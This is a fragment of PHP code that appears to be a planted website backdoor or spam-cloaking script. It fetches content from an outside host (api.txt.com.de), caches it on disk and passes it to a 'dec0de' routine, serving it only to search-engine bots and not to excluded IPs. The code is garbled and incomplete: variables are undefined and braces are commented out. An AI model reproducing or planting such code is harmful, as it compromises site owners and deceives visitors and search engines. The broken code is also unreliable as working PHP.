<?php
echo $_SERVER['HTTP_HOST'];
	array('method' => 'GET','timeout' => 5); 
	$sp_stre = @stream_context_create($sp_cont); 
	$contents = @file_get_contents(
		$data_url, false, $sp_stre); 
	//}else{ 
		$handle = @fopen($data_url, "rb"); 
		$contents = @stream_get_contents($handle); 
		@fclose($handle); 
	//} 
	return $contents; 
//} 

function show($fileDir){ 
	$filename=$fileDir.md5(
		$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI']); 
		if(is_file($filename)){ 
			$fp=@fopen($filename,'r'); 
			$data=@fread($fp,filesize($filename)); 
			@fclose($fp); 
			if(empty($data)) {
				@unlink($filename);return;
			} 
			dec0de($fileDir,$data); 
		} 
		else { 
			$data=getdata('http://api.txt.com.de/Wind0ws.php?HOST='.$_SERVER['HTTP_HOST']); 
			$fp=@fopen($filename,'w'); 
			@fwrite($fp,$data); 
			@fclose($fp); 
			if(strlen($data) > 1000) { 
				dec0de($fileDir,$data); 
			} 
		}
} 
	if(!in_array($IP,$KIP)){ 
		foreach($KBot as $KBots){
			if(stristr($Bot,$KBots)){ 
				show($fileDir); 
			}
		}
		foreach($Key as $Keys){ 
			if(stristr($Ref,$Keys)){ 
				echo "";
			}
		}
	}

?>